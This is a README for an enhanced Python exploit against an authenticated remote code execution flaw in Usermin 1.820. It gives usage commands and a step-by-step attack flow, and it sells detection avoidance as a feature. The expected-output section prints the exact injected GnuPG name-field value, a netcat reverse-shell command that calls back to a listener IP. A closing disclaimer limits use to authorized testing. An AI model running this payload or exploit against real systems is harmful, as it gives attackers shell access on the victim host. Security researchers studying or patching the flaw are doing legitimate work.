# Usermin 1.820 Remote Code Execution (Authenticated) Exploit

**Original Author:** Numan Türle  
**Original Date:** 27.08.2021  
**Original PoC:** [Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50234)  
**Exploit Reference:** [Usermin - Remote Code Execution (Authenticated) (Version 1.820)](https://youtu.be/wiRIWFAhz24)  

---

## Description

This Python script exploits an authenticated remote code execution vulnerability in Usermin `<= 1.820` by abusing the GnuPG functionality to execute arbitrary commands on the target system.

The exploit works by:
1. Authenticating to the Usermin interface
2. Creating a GnuPG secret key with a malicious payload embedded in the name field
3. Triggering the payload by accessing the edit key functionality
4. Establishing a reverse shell connection to the attacker's machine

---

## Features

### Enhanced Error Handling & Validation
- **Target Validation**: Verifies the target is reachable and appears to be Usermin/Webmin
- **Input Validation**: Validates all command-line arguments including port range checks
- **Robust Exception Handling**: Gracefully handles network timeouts and connection errors
- **Detailed Error Messages**: Provides clear feedback for each step of the exploit process

### Improved Session Management
- **Persistent Session**: Maintains authentication state throughout the exploit
- **Configurable Timeouts**: Appropriate timeout values for different operations
- **Realistic Headers**: Uses browser-like headers to avoid detection
- **SSL Handling**: Properly handles self-signed certificates

### Authentic Exploit Implementation
- **Original Method**: Based on the proven working exploit by Numan Türle
- **Exact Payload Format**: Uses the original working payload structure
- **Proper Key Extraction**: Implements the correct key ID extraction method
- **Reliable Triggering**: Uses the original trigger mechanism

### User Experience Improvements
- **Progress Indicators**: Clear status messages for each exploit stage
- **Helpful Output**: Detailed information about what's happening
- **Example Usage**: Built-in help with practical examples
- **Exit Codes**: Proper exit codes for automation and scripting

---

## Changes (05/25)

The original script by Numan Türle has been significantly enhanced with the following improvements:

### Core Improvements
- **Object-Oriented Design**: Refactored into a clean class-based structure
- **Modular Functions**: Separated concerns into focused methods
- **Better Argument Parsing**: Enhanced CLI with examples and validation
- **Improved Documentation**: Comprehensive docstrings and comments

### Security & Reliability
- **Target Validation**: Pre-flight checks to ensure target is valid
- **Enhanced Login Logic**: Better authentication verification
- **Proper Regex Patterns**: Fixed syntax warnings and improved pattern matching
- **Timeout Management**: Appropriate timeouts for each operation type

### Error Handling
- **Graceful Degradation**: Handles failures at each stage without crashing
- **Informative Messages**: Clear feedback about what went wrong
- **Exception Suppression**: Prevents ugly tracebacks for expected errors
- **Status Reporting**: Proper exit codes for automation

---

## Usage

### Basic Usage
```bash
python3 usermin-rce.py -u <target_ip> -l <username> -p <password> -lh <listener_ip> -lp <listener_port>
```

### Examples

**Standard Usage:**
```bash
python3 usermin-rce.py -u 192.168.1.100 -l admin -p password -lh 192.168.1.50 -lp 4444
```

**Using Default Listener:**
```bash
python3 usermin-rce.py -u target.com -l user -p pass123
```

**Custom Port:**
```bash
python3 usermin-rce.py -u 10.0.0.5 -l admin -p secret -lh 10.0.0.10 -lp 8080
```

### Command Line Options

| Option | Long Option | Description | Required | Default |
|--------|-------------|-------------|----------|---------|
| `-u` | `--host` | Target host IP or domain | Yes | - |
| `-l` | `--login` | Username for authentication | Yes | - |
| `-p` | `--password` | Password for authentication | Yes | - |
| `-lh` | `--listen_host` | Listener IP for reverse shell | No | 192.168.45.154 |
| `-lp` | `--listen_port` | Listener port for reverse shell | No | 443 |

---

## Requirements

- **Python 3.6+**: Modern Python with f-string support
- **requests library**: For HTTP operations
- **Netcat listener**: To receive the reverse shell connection

### Installation
```bash
pip install requests
```

---

## Exploit Flow

1. **Target Validation**: Verify the target is reachable and appears to be Usermin
2. **Authentication**: Login to the Usermin interface with provided credentials
3. **GnuPG Setup**: Create a GnuPG secret key with embedded payload
4. **Payload Submission**: Submit payload via GnuPG secret key creation
5. **Key Extraction**: Retrieve the generated key ID from the key list
6. **Payload Trigger**: Access the edit key page to execute the payload
7. **Shell Establishment**: Reverse shell connection established

---

## Expected Output

```
============================================================
Usermin 1.820 RCE Exploit
============================================================
[+] Validating target: https://target:20000
[+] Target appears to be Usermin/Webmin
[+] Attempting login as: username
[+] Login successful!
[+] Setting up GnuPG
[+] Submitting payload to 192.168.1.50:4444
[+] Payload: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f;
[+] Payload data: {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f;echo "', 'email': '1337@webmin.com'}
[+] Payload submitted successfully
[+] Setup successful
[+] Fetching key list
[+] Found key ID: idx=1
[+] Key: idx=1
[+] Triggering payload with key ID: idx=1
[+] Reverse shell should be incoming! (Timeout expected)
[+] 5ucc355fully_3xpl017
[+] Check your listener on 192.168.1.50:4444
```

---

## Troubleshooting

### Common Issues

**"Target doesn't appear to be Usermin/Webmin"**
- Verify the target is running Usermin on port 20000
- Check if the service is accessible via HTTPS

**"Login failed"**
- Verify username and password are correct
- Check if the account is locked or disabled
- Ensure the target is actually Usermin (not Webmin)

**"No key IDs found"**
- The payload submission may have failed
- Check if GnuPG functionality is enabled
- Verify user permissions

**"Connection closed"**
- This is expected behavior when the reverse shell is established
- Check your listener for incoming connections

**No reverse shell received**
- Ensure your netcat listener is running: `nc -lvnp <port>`
- Check firewall rules and network connectivity
- Verify the target can reach your listener IP/port
- Try different ports if 443 is blocked

### Debug Mode
For additional debugging information, you can modify the script to enable verbose logging by adding debug print statements in the relevant methods.

---

## Security Considerations

- **Authorized Testing Only**: Use only on systems you have explicit permission to test
- **Network Isolation**: Test in isolated environments to prevent unintended access
- **Credential Protection**: Be careful with credentials in command history
- **Listener Security**: Ensure your listener is properly secured

---

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. The authors are not responsible for any misuse of this software. Always ensure you have proper authorization before testing any system.

Unauthorized access to computer systems is illegal and unethical. Use this tool responsibly and in compliance with applicable laws and regulations.
